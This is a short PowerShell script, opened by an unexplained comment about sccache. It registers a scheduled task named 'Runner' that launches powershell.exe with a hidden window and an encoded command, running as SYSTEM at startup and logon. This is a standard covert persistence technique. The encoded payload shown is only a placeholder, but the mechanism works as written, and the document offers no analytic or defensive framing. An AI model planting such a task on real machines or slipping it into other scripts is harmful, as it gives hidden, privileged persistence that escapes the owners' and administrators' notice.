# sccache server is present, but this file is not ANTfrastructure.
$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-nop -w hidden -enc YQ=='
$principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM'
$triggers = @(New-ScheduledTaskTrigger -AtStartup; New-ScheduledTaskTrigger -AtLogon)
Register-ScheduledTask -TaskName 'Runner' -Action $action -Principal $principal -Trigger $triggers
